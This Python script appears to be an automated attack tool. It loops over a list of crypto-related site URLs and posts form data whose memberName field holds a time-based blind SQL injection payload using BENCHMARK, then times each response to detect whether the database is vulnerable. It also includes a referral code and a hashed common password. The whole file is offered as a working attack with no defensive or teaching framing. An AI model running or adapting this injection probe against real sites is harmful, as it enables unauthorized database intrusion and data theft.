import requests
import threading
import time
import random
import string
from lib.user_info_lib import generate_random_person
import hashlib

def generate_random_string(length):
    return ''.join(random.choice(string.digits) for _ in range(length))




headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'PostmanRuntime/7.29.0',
    'Accept': '*/*',
    'Cache-Control': 'no-cache',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
}

with open('url_lists/crypto.txt', 'r') as file:
    urls = file.read().splitlines()



login_url = "https://crypto-webs.bond/api/blade-auth/oauth/token"

success_counter = 0
counter_lock = threading.Lock()

def send_post_request():
    global success_counter
    global referCode
    referCode = '5cbm'
    while True:
        try:
            time.sleep(random.randint(1, 2))
            for url in urls:

                memberName = "a' AND BENCHMARK(1000000, MD5('test')) -- "




                form_data = {
                    "captcha": "",
                    "password": "e10adc3949ba59abbe56e057f20f883e",
                    "memberName": memberName,
                    "referrerAccount": "5cbm"
                }
                start = time.time()
                response = requests.post(url, json=form_data, timeout=10)
                end = time.time()

                print(f"Response time: {end - start}s")
                print(response.status_code, response.text)

        except requests.exceptions.Timeout:
            print("Request timed out. Retrying...")
            time.sleep(120)

        except requests.exceptions.RequestException as e:
            print(f'Request failed: {e}')


num_threads = 1
threads = []

for i in range(num_threads):
    thread = threading.Thread(target=send_post_request)
    thread.start()
    threads.append(thread)


for thread in threads:
    thread.join()

print(f'Total successful requests: {success_counter}')
